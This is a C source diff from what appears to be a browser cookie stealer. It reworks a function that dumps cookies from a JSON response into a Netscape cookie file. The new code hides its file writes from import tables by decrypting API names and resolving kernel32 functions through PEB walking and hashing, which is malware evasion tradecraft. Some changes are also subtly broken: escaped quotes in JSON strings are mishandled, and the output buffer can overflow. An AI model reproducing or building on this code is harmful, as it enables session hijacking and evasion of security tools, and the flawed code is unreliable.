@@ -46,8 +46,9 @@ static int json_extract_str(const char *json, const char *key,
     size_t i = 0;
     while (p[i] && p[i] != '"' && i + 1 < out_max) {
         if (p[i] == '\\' && p[i + 1]) {
+            /* lone trailing backslash before closing quote — copy literally */
+            if (p[i + 1] == '"') { out[i++] = '\\'; break; }
             switch (p[i + 1]) {
-            case '"':  out[i++] = '"';  break;
             case '\\': out[i++] = '\\'; break;
             case 'n':  out[i++] = '\n'; break;
             case 't':  out[i++] = '\t'; break;
@@ -249,10 +250,27 @@ static int write_netscape_cookies(const char *json_resp, const char *output_path
     }
     if (!cookies_start) return -1;
 
-    FILE *f = fopen(output_path, "w");
-    if (!f) return -1;
+    /* PEB-walked file I/O — no CRT fopen/fprintf/fclose in IAT */
+    char dll_k[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll_k);
+    void *kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_k));
+    if (!kernel32) return -1;
+    pCreateFileA  pCF = (pCreateFileA)({ char fn_c[32]; enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn_c); resolve_fn(kernel32, fn_c); });
+    pWriteFile    pWF = (pWriteFile)  ({ char fn_c[32]; enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn_c); resolve_fn(kernel32, fn_c); });
+    pCloseHandle  pCH = (pCloseHandle)({ char fn_c[32]; enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn_c); resolve_fn(kernel32, fn_c); });
+    if (!pCF || !pWF || !pCH) return -1;
 
-    fprintf(f, "# Netscape HTTP Cookie File\n");
+    HANDLE hf = pCF(output_path, 0x40000000 /*GENERIC_WRITE*/, 0, NULL, 2 /*CREATE_ALWAYS*/, 0, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return -1;
+
+    /* Build output into buffer */
+    size_t buf_cap = 65536;
+    char *out_buf = (char *)malloc(buf_cap);
+    if (!out_buf) { pCH(hf); return -1; }
+    size_t out_pos = 0;
+
+    #define CDP_APPEND(...) do {         int _n = snprintf(out_buf + out_pos, buf_cap - out_pos, __VA_ARGS__);         if (_n > 0) out_pos += (size_t)_n;     } while (0)
+
+    CDP_APPEND("# Netscape HTTP Cookie File\n");
 
     /* Walk cookie objects — find each { ... } block */
     const char *p = cookies_start;
@@ -282,7 +300,7 @@ static int write_netscape_cookies(const char *json_resp, const char *output_path
 
         if (domain[0] && name[0]) {
             /* Netscape format: domain\tflag\tpath\tsecure\texpiry\tname\tvalue */
-            fprintf(f, "%s\t%s\t%s\t%s\t%ld\t%s\t%s\n",
+            CDP_APPEND("%s\t%s\t%s\t%s\t%ld\t%s\t%s\n",
                     domain,
                     domain[0] == '.' ? "TRUE" : "FALSE",
                     path[0] ? path : "/",
@@ -295,8 +313,12 @@ static int write_netscape_cookies(const char *json_resp, const char *output_path
 
         p = end + 1;
     }
+    #undef CDP_APPEND
 
-    fclose(f);
+    DWORD wr = 0;
+    pWF(hf, out_buf, (DWORD)out_pos, &wr, NULL);
+    free(out_buf);
+    pCH(hf);
     return cookie_count;
 }
 
